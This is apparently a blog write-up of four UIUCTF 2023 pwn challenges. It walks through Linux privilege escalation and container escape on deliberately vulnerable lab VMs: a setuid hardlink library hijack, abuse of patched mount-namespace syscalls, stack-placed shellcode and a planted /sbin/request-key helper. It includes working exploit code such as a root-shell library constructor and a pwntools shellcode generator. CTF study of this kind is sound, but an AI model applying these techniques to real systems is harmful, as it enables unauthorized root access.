---
title: "UIUCTF 2023 Writeups"
date: 2023-07-06T00:00:01Z
draft: true    
tags:
  - ctf
  - pwn
---

## Zapping a Setuid 1

> I was reading [how Zapps work](https://zapps.app/technology/) the other day and I thought I could [do better](https://github.com/warptools/ldshim/issues/1). However, what happens when a setuid was zapped?

Hint:

> Oops I left [CVE-2009-0876](https://bugs.gentoo.org/260331) open.

Looking around the VM, we saw a directory with a `setuid` binary named `exe`:

```
uiuctf-2023:~/zapps/build$ ls -la
total 2456
drwxr-xr-x 1 root root      76 Jun 19 18:12 .
drwxr-xr-x 1 root root      16 Jun 20 16:35 ..
-rwsr-xr-x 1 root root   31280 Jun 19 18:12 exe
-rwxr-xr-x 1 root root  240936 Jun 19 18:12 ld-linux-x86-64.so.2
-rwxr-xr-x 1 root root   17464 Jun 19 18:12 lib.so
-rw-r--r-- 1 root root 2216304 Jun 19 18:12 libc.so.6
```

Some background on `setuid` binary: If a binary has `setuid` flag set, when an user execute that binary normally, the process will have privileges of the file's **owner**.
For example `sudo` uses this feature in order to run commands with `root` privileges after checking current user's permissions.

Running the `exe`, we got the following output:

```
uiuctf-2023:~/zapps/build$ ./exe
static_constructor in lib invoked
static_constructor in exe invoked
main invoked with arguments:
argv[0] = ./exe
foo invoked
contents of /proc/self/maps:
555555fbf000-555555fe0000 rw-p 00000000 00:00 0                          [heap]
7f53d7218000-7f53d721b000 rw-p 00000000 00:00 0
7f53d721b000-7f53d7243000 r--p 00000000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
7f53d7243000-7f53d73d8000 r-xp 00028000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
7f53d73d8000-7f53d7430000 r--p 001bd000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
7f53d7430000-7f53d7434000 r--p 00214000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
7f53d7434000-7f53d7436000 rw-p 00218000 00:0f 296643                     /usr/lib/zapps/build/libc.so.6
7f53d7436000-7f53d7443000 rw-p 00000000 00:00 0
7f53d7443000-7f53d7444000 r--p 00000000 00:0f 296642                     /usr/lib/zapps/build/lib.so
7f53d7444000-7f53d7445000 r-xp 00001000 00:0f 296642                     /usr/lib/zapps/build/lib.so
7f53d7445000-7f53d7446000 r--p 00002000 00:0f 296642                     /usr/lib/zapps/build/lib.so
7f53d7446000-7f53d7447000 r--p 00002000 00:0f 296642                     /usr/lib/zapps/build/lib.so
7f53d7447000-7f53d7448000 rw-p 00003000 00:0f 296642                     /usr/lib/zapps/build/lib.so
7f53d7448000-7f53d744a000 rw-p 00000000 00:00 0
7f53d744a000-7f53d744c000 r--p 00000000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
7f53d744c000-7f53d7476000 r-xp 00002000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
7f53d7476000-7f53d7481000 r--p 0002c000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
7f53d7481000-7f53d7482000 ---p 00000000 00:00 0
7f53d7482000-7f53d7484000 r--p 00037000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
7f53d7484000-7f53d7486000 rw-p 00039000 00:0f 296641                     /usr/lib/zapps/build/ld-linux-x86-64.so.2
7f53d7486000-7f53d7487000 r--p 00000000 00:0f 296640                     /usr/lib/zapps/build/exe
7f53d7487000-7f53d7488000 r-xp 00001000 00:0f 296640                     /usr/lib/zapps/build/exe
7f53d7488000-7f53d7489000 r--p 00002000 00:0f 296640                     /usr/lib/zapps/build/exe
7f53d7489000-7f53d748a000 r--p 00002000 00:0f 296640                     /usr/lib/zapps/build/exe
7f53d748a000-7f53d748b000 rw-p 00003000 00:0f 296640                     /usr/lib/zapps/build/exe
7ffd50913000-7ffd50934000 rw-p 00000000 00:00 0                          [stack]
7ffd50996000-7ffd5099a000 r--p 00000000 00:00 0                          [vvar]
7ffd5099a000-7ffd5099c000 r-xp 00000000 00:00 0                          [vdso]
```

From the output, we can see that the `exe` loads `lib.so`, `libc.so.6` and `ld-linux-x86-64.so.2`.
That means if we can compromise one of those, we can execute code with `root` privileges since `exe` is a `setuid` binary with `root` as owner.
The problem is we cannot write to `/usr/lib/zapps/build/`. It's time to look at the report mentioned in the hint:

> ... hardlinks on Linux preserve permission, including set*id bits, and can be created by non-root users.

That means if we create a hardlink to `/usr/lib/zapps/build/exe` at somewhere else, it will still have the `setuid` bit set. We can create the hardlink using the following command:

```
uiuctf-2023:~$ ln /usr/lib/zapps/build/exe
```

Now copy `lib.so`, `libc.so.6` and `ld-linux-x86-64.so.2` to the same directory with the hard link to do a test run:

```
uiuctf-2023:~$ cp /usr/lib/zapps/build/*.so* .
uiuctf-2023:~$ ls
exe  init_chal  ld-linux-x86-64.so.2  lib.so  libc.so.6  zapps
uiuctf-2023:~$ ./exe
./exe: error while loading shared libraries: lib.so: cannot open shared object file: No such file or directory
```

Seems like the `ld` cannot find `lib.so` in any of the search paths. I decided to just patch one of the search path in `ld` to `/home/user/` using this python script:

```python
with open('ld-linux-x86-64.so.2', 'rb') as f:
    dat = f.read()

dat = dat[:180311] + b'/home/user////////////////' + dat[180337:]

with open('ld-linux-x86-64.so.2', 'wb') as f:
    f.write(dat)
```

Now it can run again:

```
uiuctf-2023:~$ ./exe
static_constructor in lib invoked
static_constructor in exe invoked
main invoked with arguments:
argv[0] = ./exe
foo invoked
contents of /proc/self/maps:
555555cb9000-555555cda000 rw-p 00000000 00:00 0                          [heap]
7f5a1c023000-7f5a1c026000 rw-p 00000000 00:00 0
7f5a1c026000-7f5a1c04e000 r--p 00000000 00:0f 297376                     /home/user/libc.so.6
7f5a1c04e000-7f5a1c1e3000 r-xp 00028000 00:0f 297376                     /home/user/libc.so.6
7f5a1c1e3000-7f5a1c23b000 r--p 001bd000 00:0f 297376                     /home/user/libc.so.6
7f5a1c23b000-7f5a1c23f000 r--p 00214000 00:0f 297376                     /home/user/libc.so.6
7f5a1c23f000-7f5a1c241000 rw-p 00218000 00:0f 297376                     /home/user/libc.so.6
7f5a1c241000-7f5a1c24e000 rw-p 00000000 00:00 0
7f5a1c24e000-7f5a1c24f000 r--p 00000000 00:0f 297375                     /home/user/lib.so
7f5a1c24f000-7f5a1c250000 r-xp 00001000 00:0f 297375                     /home/user/lib.so
7f5a1c250000-7f5a1c251000 r--p 00002000 00:0f 297375                     /home/user/lib.so
7f5a1c251000-7f5a1c252000 r--p 00002000 00:0f 297375                     /home/user/lib.so
7f5a1c252000-7f5a1c253000 rw-p 00003000 00:0f 297375                     /home/user/lib.so
7f5a1c253000-7f5a1c255000 rw-p 00000000 00:00 0
7f5a1c255000-7f5a1c257000 r--p 00000000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
7f5a1c257000-7f5a1c281000 r-xp 00002000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
7f5a1c281000-7f5a1c28c000 r--p 0002c000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
7f5a1c28c000-7f5a1c28d000 ---p 00000000 00:00 0
7f5a1c28d000-7f5a1c28f000 r--p 00037000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
7f5a1c28f000-7f5a1c291000 rw-p 00039000 00:0f 297374                     /home/user/ld-linux-x86-64.so.2
7f5a1c291000-7f5a1c292000 r--p 00000000 00:0f 296640                     /home/user/exe
7f5a1c292000-7f5a1c293000 r-xp 00001000 00:0f 296640                     /home/user/exe
7f5a1c293000-7f5a1c294000 r--p 00002000 00:0f 296640                     /home/user/exe
7f5a1c294000-7f5a1c295000 r--p 00002000 00:0f 296640                     /home/user/exe
7f5a1c295000-7f5a1c296000 rw-p 00003000 00:0f 296640                     /home/user/exe
7ffdc7547000-7ffdc7568000 rw-p 00000000 00:00 0                          [stack]
7ffdc75a9000-7ffdc75ad000 r--p 00000000 00:00 0                          [vvar]
7ffdc75ad000-7ffdc75af000 r-xp 00000000 00:00 0                          [vdso]
```

I then created a new `lib.so` using the following C code:

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static __attribute__((constructor)) void static_constructor(void) {
    // Set effective user id of the process to root
    setuid(0);
    perror("setuid");
    // Set effective group id of the process to root
    setgid(0);
    perror("setgid");
    // Spawn a shell
    execlp("/bin/bash", "bash", "-l", NULL);
}

void foo(void) {
    printf("foo invoked\n");
}
```

Compile it with:

```
uiuctf-2023:~$ cc -o lib.so x.c -fPIC -shared
```

Now we run the `exe` with our new `lib.so`:

```
uiuctf-2023:~$ ./exe
setuid: Success
setgid: Success
uiuctf-2023:~# id
uid=0(root) gid=0(root) groups=0(root),1000(user)
uiuctf-2023:~# cat /mnt/flag
uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
```

## Zapping a Setuid 2

> Ok ok ok, but what if there was another way?

Hint 1:

> The "zapps" symlink is for accessibility. The intended solution does not depend on the symlink.

Hint 2:

> The additional patches to this challenge are hints.

In this version `protected_hardlinks` is enable so `user` cannot create hard link of `exe` anymore.
But the kernel is modified with some patches. Let's analyze them.

```diff
From 7d26a340113813b6f9064b25f2928c177269d2f5 Mon Sep 17 00:00:00 2001
From: YiFei Zhu <zhuyifei@google.com>
Date: Mon, 19 Jun 2023 22:26:16 -0700
Subject: [PATCH] fs/namespace: Allow generic loopback mount without requiring
 nsfs

The argument was flawed and was never agreed upon [1].

After 18 years, what could possibly go wrong?

[1] https://lore.kernel.org/all/1131563299.5400.392.camel@localhost/T/#t

Signed-off-by: YiFei Zhu <zhuyifei@google.com>
---
 fs/namespace.c | 3 ---
 1 file changed, 3 deletions(-)

diff --git a/fs/namespace.c b/fs/namespace.c
index 4f520f800dbc..eb196f016e3f 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2396,9 +2396,6 @@ static struct mount *__do_loopback(struct path *old_path, int recurse)
     if (IS_MNT_UNBINDABLE(old))
         return mnt;
 
-    if (!check_mnt(old) && old_path->dentry->d_op != &ns_dentry_operations)
-        return mnt;
-
     if (!recurse && has_locked_children(old, old_path->dentry))
         return mnt;
 
-- 
2.41.0
```

`check_mnt` is used to check if the path is in the same mount namespace as the current task's mount namespace.
By removing this check, the patch allows cross loopback mounting between different mount namespaces.

```diff
From 9946c9e1e098884064df8a394a6ef992c94d21e6 Mon Sep 17 00:00:00 2001
From: YiFei Zhu <zhuyifei@google.com>
Date: Mon, 19 Jun 2023 21:39:32 -0700
Subject: [PATCH] fs/namespace: Allow unpriv OPEN_TREE_CLONE

OPEN_TREE_CLONE is only really useful when you could use move_mount()
to perform a bind mount. Otherwise all you get is an fd equivalent to
an O_PATH'ed fd that is detached, without a way to modify any
mountpoints of the current namespace.

What could possibly go wrong?

Signed-off-by: YiFei Zhu <zhuyifei@google.com>
---
 fs/namespace.c | 3 ---
 1 file changed, 3 deletions(-)

diff --git a/fs/namespace.c b/fs/namespace.c
index df137ba19d37..4f520f800dbc 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2527,9 +2527,6 @@ SYSCALL_DEFINE3(open_tree, int, dfd, const char __user *, filename, unsigned, fl
     if (flags & AT_EMPTY_PATH)
         lookup_flags |= LOOKUP_EMPTY;
 
-    if (detached && !may_mount())
-        return -EPERM;
-
     fd = get_unused_fd_flags(flags & O_CLOEXEC);
     if (fd < 0)
         return fd;
-- 
2.41.0
```

This patch allow unprivileged user to call `SYS_open_tree` with `OPEN_TREE_CLONE` flag.

```diff
From 7bba6f2216c5b757e38cd90f7b12bdf952e316c7 Mon Sep 17 00:00:00 2001
From: YiFei Zhu <zhuyifei@google.com>
Date: Mon, 19 Jun 2023 23:04:25 -0700
Subject: [PATCH] fs/namespace: Check userns instead of mntns in mnt_may_suid

If we are in the same userns, I don't see why we need to check
if we are in the same mntns too, right?

Signed-off-by: YiFei Zhu <zhuyifei@google.com>
---
 fs/namespace.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/fs/namespace.c b/fs/namespace.c
index eb196f016e3f..25757327a82a 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -4609,7 +4609,8 @@ bool mnt_may_suid(struct vfsmount *mnt)
      * suid/sgid bits, file caps, or security labels that originate
      * in other namespaces.
      */
-    return !(mnt->mnt_flags & MNT_NOSUID) && check_mnt(real_mount(mnt)) &&
+    return !(mnt->mnt_flags & MNT_NOSUID) &&
+           current_in_userns(real_mount(mnt)->mnt_ns->user_ns) &&
            current_in_userns(mnt->mnt_sb->s_user_ns);
 }
 
-- 
2.41.0
```

This patch allows `setuid` binary behavior if the user namespace that is holding the current mount is the same as the current user namespace of the task.

The goal of this challenge is still the same as the previous one: try to make the `setuid` binary loads our custom library. How can we abuse the patches to achieve that?

By calling `SYS_open_tree` with `OPEN_TREE_CLONE`, the tree will be in a detached state. We can attach the tree using `SYS_move_mount`, but it requires `CAP_SYS_ADMIN` in order to modify the mount table. Interestingly, in detached state, the root of the tree will be at `/`. If we call `SYS_execveat` using the detached tree as the `dirfd`, `/proc/self/exe` symlink will not be the full path to the binary. Example in pseudocode:

```c
fd = SYS_open_tree(AT_FDCWD, "/usr/lib/zapps", OPEN_TREE_CLONE | AT_RECURSIVE)
SYS_execveat(fd, "build/exe")
// /proc/self/exe now links to /build/exe
```

This is convenient because the loader code of `zapps` finds `ld.so` using `/proc/self/exe` link (file `zapps-crt0.c` in the handout package):

```c
    char ld_rel[] = "/ld-linux-x86-64.so.2";
    // ...
    exe_path_len = _zapps_sys_readlink((char []){"/proc/self/exe"}, ld, PATH_MAX);
    if (exe_path_len < 0 || exe_path_len >= PATH_MAX)
        _zapps_die("Zapps: Fatal: failed to readlink /proc/self/exe\n");

    ld[exe_path_len] = '\0';
    *_zapps_strrchr(ld, '/') = '\0';
    _zapps_strncat(ld, ld_rel, sizeof(ld) - 1);

    ld_fd = _zapps_sys_open(ld, O_RDONLY | O_CLOEXEC);
    if (ld_fd < 0)
        _zapps_die("Zapps: Fatal: failed to open ld.so\n");
```

But we cannot freely create any directory as `user`. Fortunately, patch #1 allows us to do cross loopback mount between mount namespaces. We will do the following:

- Fork the process
- In the child process:
  - Call `unshare(CLONE_NEWUSER | CLONE_NEWNS)` to enter a new mount namespace and have `CAP_SYS_ADMIN` so we can modify the mount table
  - Bind mount `/usr/lib/zapps` to `/home/user/home/user`
  - Call `SYS_open_tree(AT_FDCWD, "/home/user", 0)` to open a tree `fd`
  - Start an infinite loop to keep the namespaces
- In the original process:
  - Sleep to wait for the child to complete all mount operations
  - Call `fd = SYS_open_tree(AT_FDCWD, "/proc/<child_pid>/fd/3", OPEN_TREE_CLONE | AT_RECURSIVE)` to clone a detached tree of `/home/user` in the child mount namespace (patch #2 allows `user` to do this)
  - Call `SYS_execveat(fd, "home/user/build/exe")` to launch the binary (patch #3 allows the `setuid` behavior even though the tree is in another mount namespace)

When the binary is executed, `/proc/self/exe` links to `/home/user/build/exe`. Copy `*so*` files from `/usr/lib/zapps/build/` to `/home/user/build/`, patch `ld` and create a custom `lib.so` like previous challenge and we will get a root shell.

Flag: `uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}`

## Virophage

> This challenge is inspired by TSJ CTF 2022's ["virus" challenge](https://github.com/XxTSJxX/TSJ-CTF-2022/tree/main/Pwn/Virus).

> I thought a virus could be even tinier, but I there's a catch: are viruses alive or dead? What separates living organisms from lifeless objects? Can viruses [infect other viruses](https://en.wikipedia.org/wiki/Virophage)?

> **Note: This challenge has not been solved by the author.** [Have fun!](https://xkcd.com/356/)

The challenge's executable (the spawner) is a `setuid` binary, owned by `root` at `/home/user/virophage`.
It will do the following:

- Isolate `/tmp` by changing into another mount namespace
- Ask the user to provide a number in hex, called `phage` in the source code
- Create a 32-bit ELF file at `/tmp/virus` with this header:

```c
struct {
    Elf32_Ehdr ehdr;
    Elf32_Phdr phdr;
} data = {
    .ehdr = {
        .e_ident = {
            ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3,
            ELFCLASS32, ELFDATA2LSB, EV_CURRENT,
            ELFOSABI_SYSV
        },
        .e_type = ET_EXEC,
        .e_machine = EM_386,
        .e_version = EV_CURRENT,
        .e_entry = phage,
        .e_ehsize = sizeof(Elf32_Ehdr),
        .e_phentsize = sizeof(Elf32_Phdr),
        .e_phnum = 1,
    },
    .phdr = {
        .p_type = PT_NULL,
    },
};
```

- Change effective user id to `root`
- Disable ASLR for child process (or execve'd by this process) by calling `SYS_personality(ADDR_NO_RANDOMIZE)`
- Execute `/tmp/virus`

From the ELF header, we can see that the number we entered will be used as the entry address of the virus.
How can we execute code? Using the provided test environment, let's attach `gdb` to it:

```
(gdb) r
Starting program: /home/user/virophage
Please enter a number in hex: 0x0
You entered: 0x00000000
execve...
process 70 is executing new program: /tmp/virus

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

As expected, the program crashes at where we set the entry point. Examine the mappings:

```
(gdb) info proc mappings
process 70
Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
        0xf7ff8000 0xf7ffc000     0x4000        0x0  r--p   [vvar]
        0xf7ffc000 0xf7ffe000     0x2000        0x0  r-xp   [vdso]
        0xfffdd000 0xffffe000    0x21000        0x0  rwxp   [stack]
(gdb)
```

Notice that permission of the stack is `rwxp`, which means we can execute code on stack. Why does this happen?
Reading through [the `man` page of ELF](https://man7.org/linux/man-pages/man5/elf.5.html),
we know that `PT_GNU_STACK` program header is used to control the state of the stack (R, W, X)
base on the `p_flag` field in `Elf32_Phdr` structure. But in the generated header of the virus, that header is not available.
So what is the default permission of the stack? Why isn't it non-executable by default? Let's look at the kernel:

```c
/*
 * An executable for which elf_read_implies_exec() returns TRUE will
 * have the READ_IMPLIES_EXEC personality flag set automatically.
 *
 * The decision process for determining the results are:
 *
 *                 CPU: | lacks NX*  | has NX, ia32     | has NX, x86_64 |
 * ELF:                 |            |                  |                |
 * ---------------------|------------|------------------|----------------|
 * missing PT_GNU_STACK | exec-all   | exec-all         | exec-none      |
 * PT_GNU_STACK == RWX  | exec-stack | exec-stack       | exec-stack     |
 * PT_GNU_STACK == RW   | exec-none  | exec-none        | exec-none      |
 *
 *  exec-all  : all PROT_READ user mappings are executable, except when
 *              backed by files on a noexec-filesystem.
 *  exec-none : only PROT_EXEC user mappings are executable.
 *  exec-stack: only the stack and PROT_EXEC user mappings are executable.
 *
 *  *this column has no architectural effect: NX markings are ignored by
 *   hardware, but may have behavioral effects when "wants X" collides with
 *   "cannot be X" constraints in memory permission flags, as in
 *   https://lkml.kernel.org/r/20190418055759.GA3155@mellanox.com
 *
 */
#define elf_read_implies_exec(ex, executable_stack)	\
	(mmap_is_ia32() && executable_stack == EXSTACK_DEFAULT)
```

The virus is a 32-bit ELF, so the decision will be `exec-all`. Along with the fact that ASLR is disabled for the virus,
we can point the entry address to the stack and execute code. But how do we put code on the stack? Looking at the entry point of the spawner:

```c
void virophage_start_main(void **stack)
{
	void *argv, *envp;
	unsigned int i;
	int argc;

	argc = (uintptr_t)*stack++;

	argv = (void *)stack;
	for (i = 0; i < argc; i++)
		stack++;
	stack++;

	envp = stack;

	_vp_sys_exit(virophage_main(argc, argv, envp));
}

__asm__ (
	".globl _start\n"
	".section .text,\"ax\",@progbits\n"
	".type _start, @function\n"
	"_start:\n"
	"	mov %rsp, %rdi\n"
	"	call virophage_start_main\n"
	"	hlt\n"
);
```

All arguments and environment variables that we pass to the spawner will be available on the stack.
Later, the virus is executed using the following parameters:

```c
_vp_sys_execve("/tmp/virus", argv, envp);
```

That means the virus will inherit all arguments and environment variables of the spawner. These will also be on the virus's stack.
We can pass a non-null shellcode as an argument for the spawner then point the entry address of the virus to it.
Padding some `nop` instructions before the actual shellcode will make it easier to identify on the stack.
I used the following script to generate a base64 encoded shellcode:

```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

print(b64e(asm(shellcraft.cat('/mnt/flag')).rjust(0x100, b'\x90')))
```

Save the output to `/home/user/arg`. Now attach the `gdb` to the spawner again and find where our shellcode is:

```
(gdb) file virophage
Reading symbols from virophage...
(gdb) r $(base64 -d /home/user/arg)
Starting program: /home/user/virophage $(base64 -d /home/user/arg)
Please enter a number in hex: 0x0
You entered: 0x00000000
execve...
process 123 is executing new program: /tmp/virus

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) find $esp, +0x200, (int)0x90909090
0xffffde22
0xffffde23
0xffffde24
0xffffde25
0xffffde26
0xffffde27
0xffffde28
0xffffde29
0xffffde2a
0xffffde2b
0xffffde2c
0xffffde2d
0xffffde2e
0xffffde2f
0xffffde30
...
```

I choose `0xffffde30` as the entry point to avoid any alignment problems.
Now we go to the server, write the encoded shellcode to `/home/user/arg` and run the spawner:

```
uiuctf-2023:~$ ./virophage $(base64 -d /home/user/arg)
Please enter a number in hex: 0xffffde30
You entered: 0xFFFFDE30
execve...
uiuctf{windows_defender_wont_catch_this_bc238ba4}
Segmentation fault
```

## Am I not root?

> Ever wondered why nsjail prints a giant warning when it's run as root? Well, now you know ;)

Hint:

> I disabled coredumps and modules. What else are there?

The first thing that came to my mind was loading a kernel module, but it is disabled.
Then I remember that `/sbin/modprobe` will be called by the kernel if I execute a file with unknown magic bytes.
But since kernel module loading is disabled, we cannot use it too. What else?

The kernel will sometimes call user mode helper like `/sbin/modprobe` using `call_usermodehelper_setup` and `call_usermodehelper_exec`.
`call_usermodehelper` will call both functions.

Finding references to those functions, I found an interesting call in
[`security/keys/request_key.c`](https://elixir.bootlin.com/linux/v6.1.32/source/security/keys/request_key.c#L196),
which will calls `/sbin/request-key`. Searching for it, I came to [the documentation of Key Request Service](https://www.kernel.org/doc/html/v4.15/security/keys/request-key.html).
According to the documentation, we can make the kernel execute `/sbin/request-key` by calling `SYS_request_key` syscall.

Since we are root, we can create `/sbin/request-key` file. I populated it with the following script:

```sh
#!/bin/sh
cat /mnt/flag > /tmp/flag
```

We also have to run `chmod +x /sbin/request-key` to make it executable.

After that, I call `SYS_request_key` using the example in
[the `man` page of `SYS_request_key`](https://man7.org/linux/man-pages/man2/request_key.2.html), and the flag were written to `/tmp/flag`.

```
uiuctf-2023:/home/user# ./a.out user mtk:key1 "Payload data"
request_key: Required key not available
uiuctf-2023:/home/user# cat /tmp/flag
uiuctf{need_more_isolations_for_root_5a4bb464}
```
